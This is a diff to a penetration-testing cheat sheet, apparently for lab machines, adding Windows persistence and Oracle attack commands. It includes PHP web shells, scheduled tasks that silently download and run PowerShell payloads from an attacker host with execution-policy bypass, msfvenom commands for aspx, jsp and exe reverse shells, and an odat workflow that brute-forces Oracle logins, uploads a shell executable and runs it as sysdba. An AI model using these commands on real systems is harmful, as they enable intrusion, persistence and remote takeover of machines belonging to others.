@@ -4,6 +4,38 @@
 	<?php echo system($_GET["cmd"]); ?>
 	<?php echo shell_exec($_GET["cmd"]); ?>
 
+## Powershell in 32 and 64 bit windows PATH
+	x64
+		C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+	x32
+		c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe	
+	
+## Scheduled tasks windows
+	(X64) - On System Start
+		schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
+ 
+	(X64) - On User Idle (30mins)
+		schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
+ 
+	(X86) - On User Login
+		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System
+  
+	(X86) - On System Start
+		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
+  
+	(X86) - On User Idle (30mins)
+		schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
+
+
+## MSFVENOM generate shell
+	aspx reverse shell 
+		msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
+	
+	jsp reverse shell 
+		msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1337 -f raw > shell.jsp
+	exe reverce shell
+		msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
+
 ## Run cmd from cmdshell:
 	cmd /c
 	cmd /k
@@ -70,10 +102,7 @@
 	Destination:  http://10.10.10.15/cmdaspx.aspx
 	```
 
-	Generate aspx reverse shell 
-		msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx
-
-
+	
 # Windows privesc
 
 # Check events
@@ -187,5 +216,29 @@
 	You can use the following exploits to escalate privileges.
 		1. Rotten Potato
    		2. Juicy Potato
+
+
+
+# ORACLE exploatetion
+	Tool for exploatation
+		https://github.com/quentinhardy/odat.git
+	Check databese name:
+		python3 odat.py sidguesser -s 10.10.10.82 -p 1521 
+	Use password list from metasploit:
+		/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.tx
+		Replace delimeter ' ' to '/'
+	Brute force login and passwords:
+		python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file credential_oracle.txt
+
+	Generate exe reverse shell and use odat to upload it:
+		python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe shell.exe 
+		
+		If error insufficient privileges:
+		
+		python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe shell.exe --sysdba
+	
+	Execute shell with odat:
+		python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
+
 	
 	
